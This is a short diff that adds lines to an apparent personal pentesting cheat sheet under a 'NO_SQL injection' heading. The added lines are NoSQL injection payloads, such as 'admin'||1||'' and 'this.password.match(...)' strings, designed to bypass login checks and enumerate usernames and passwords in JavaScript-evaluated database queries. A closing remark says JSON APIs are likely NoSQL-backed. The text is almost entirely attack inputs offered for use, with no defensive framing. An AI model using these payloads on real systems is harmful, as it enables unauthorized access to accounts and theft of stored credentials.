@@ -5,7 +5,11 @@
                                                       NO_SQL injection
                                                       ----------------
 
-
+admin'||1||'
+admin'||1||'1'=='1'
+'||this.username.match('.*')||'
+'||this.password.match('.*')||'
+'||this.password.match('^.*')||'
 
   => if the app use JSON API , it has many chances to be using no_sql 
 
